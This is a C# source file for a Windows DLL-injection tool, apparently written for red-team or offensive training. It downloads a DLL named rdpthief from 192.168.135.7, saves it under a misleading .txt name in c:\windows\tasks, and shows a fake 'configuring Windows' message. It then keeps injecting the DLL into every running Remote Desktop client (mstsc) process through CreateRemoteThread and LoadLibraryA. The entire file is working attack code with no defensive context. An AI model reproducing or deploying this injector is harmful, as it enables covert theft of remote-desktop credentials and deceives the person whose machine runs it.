using System;
using System.Text;
using System.Threading;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleAppDLLi
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            //download dll
            //String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dir = "c:\\windows\\tasks";
            WebClient wc = new WebClient();
            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
            if (defaultProxy != null)
            {
                wc.Proxy = defaultProxy;
            }
            wc.Headers.Add ("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko");
            String dllName = dir + "\\Functionalviewpictureinstalling.txt";
            wc.DownloadFile("http://192.168.135.7/rdpthief.txt", dllName);
            Console.WriteLine("Preparing to configure Windows... Do not turn off your computer.");
            while(true)
            {
                //get target pid
                Process[] mstscProc = Process.GetProcessesByName("mstsc");

                if (mstscProc.Length > 0)
                {
                    for (int i = 0; i < mstscProc.Length; i++)
                    {
                        int pid = mstscProc[i].Id;

                        //open and allocate readable and writable memory in target pid
                        IntPtr pHandle = OpenProcess(0x001F0FFF, false, pid);
                        IntPtr addr = VirtualAllocEx(pHandle, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                        //copy path and name of dll into allocated memory
                        IntPtr outSize;
                        Boolean res = WriteProcessMemory(pHandle, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
                        //locate address of LoadLibraryA in current process (likely to be same as remote process)
                        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                        //invoke LoadLibraryA (loadLib) in remote process (pHandle) to run dll copied to the allocated memory (addr)
                        IntPtr hThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
                    }
                }
                Thread.Sleep(1000);
            }            
        }
    }
}